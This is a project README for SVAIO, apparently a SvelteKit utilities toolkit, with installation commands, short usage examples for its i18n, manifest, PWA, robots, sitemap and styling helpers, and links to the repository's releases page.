# SVAIO - SvelteKit All in One Utilities 🌟

Welcome to **SVAIO**, your go-to toolkit for seamless SvelteKit development. This repository provides a collection of utilities that require no configuration, allowing you to focus on building your application. 

[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/vlad1356226/svaio/releases)

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Utilities Overview](#utilities-overview)
  - [i18n](#i18n)
  - [Manifest](#manifest)
  - [PigeonPosse](#pigeonposse)
  - [PWA](#pwa)
  - [Robots](#robots)
  - [Sitemap](#sitemap)
  - [UnoCSS](#unocss)
  - [Vite](#vite)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

SVAIO stands for **SvelteKit All in One Utilities**. This toolkit simplifies the development process by providing essential features without the need for extensive configuration. Whether you're building a personal project or a large-scale application, SVAIO has you covered.

## Features

- **No Configuration Required**: Get started quickly without the hassle of setup.
- **Comprehensive Utilities**: From internationalization to progressive web app support, we cover it all.
- **Optimized for SvelteKit**: Built specifically for the SvelteKit framework, ensuring compatibility and performance.
- **Community Driven**: Contributions are welcome to enhance and expand the toolkit.

## Installation

To get started with SVAIO, you need to clone the repository and install the dependencies. Use the following commands:

```bash
git clone https://github.com/vlad1356226/svaio.git
cd svaio
npm install
```

## Usage

Once installed, you can start using the utilities in your SvelteKit project. Each utility is designed to integrate smoothly into your workflow. Refer to the specific sections below for detailed usage instructions for each utility.

## Utilities Overview

### i18n

Internationalization (i18n) support allows you to easily manage multiple languages in your application. With SVAIO, you can set up language files and switch between languages seamlessly.

#### Example Usage

```javascript
import { i18n } from 'svaio/i18n';

i18n.setLocale('en'); // Set the current locale
console.log(i18n.translate('welcome')); // Output: "Welcome"
```

### Manifest

The manifest utility helps you create a web app manifest file. This file is essential for progressive web apps (PWAs) and provides metadata about your application.

#### Example Usage

```javascript
import { createManifest } from 'svaio/manifest';

const manifest = createManifest({
  name: 'My App',
  short_name: 'App',
  start_url: '/',
  display: 'standalone',
  background_color: '#ffffff',
  theme_color: '#000000',
});
```

### PigeonPosse

PigeonPosse is a utility for managing and displaying notifications in your application. It provides a simple API to create, update, and remove notifications.

#### Example Usage

```javascript
import { notify } from 'svaio/pigeonposse';

notify('This is a notification!', { type: 'info' });
```

### PWA

The PWA utility streamlines the process of turning your SvelteKit app into a progressive web app. It handles service worker registration and caching strategies.

#### Example Usage

```javascript
import { registerServiceWorker } from 'svaio/pwa';

registerServiceWorker('/sw.js');
```

### Robots

Manage your robots.txt file easily with the robots utility. This file instructs web crawlers on how to interact with your site.

#### Example Usage

```javascript
import { createRobots } from 'svaio/robots';

const robots = createRobots({
  UserAgent: '*',
  Disallow: '/private/',
});
```

### Sitemap

Generate a sitemap.xml file for your application with the sitemap utility. This helps search engines index your site effectively.

#### Example Usage

```javascript
import { generateSitemap } from 'svaio/sitemap';

const sitemap = generateSitemap([
  { url: '/', changefreq: 'daily', priority: 1.0 },
  { url: '/about', changefreq: 'monthly', priority: 0.8 },
]);
```

### UnoCSS

UnoCSS is a utility-first CSS framework that helps you write styles directly in your HTML. SVAIO integrates UnoCSS for rapid styling.

#### Example Usage

```html
<div class="bg-blue-500 text-white p-4">Hello, World!</div>
```

### Vite

SVAIO is built on top of Vite, a fast build tool that provides a smooth development experience. Use Vite's features to enhance your workflow.

#### Example Usage

```javascript
import { defineConfig } from 'vite';

export default defineConfig({
  plugins: [/* your plugins here */],
});
```

## Contributing

We welcome contributions from the community. If you want to contribute to SVAIO, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and create a pull request.

Please ensure your code follows the project's coding standards and includes appropriate tests.

## License

SVAIO is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

## Contact

For questions or feedback, please reach out via the [Issues](https://github.com/vlad1356226/svaio/issues) section of the repository.

[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/vlad1356226/svaio/releases)

Explore the full capabilities of SVAIO and streamline your SvelteKit development today! Check the "Releases" section for the latest updates and features.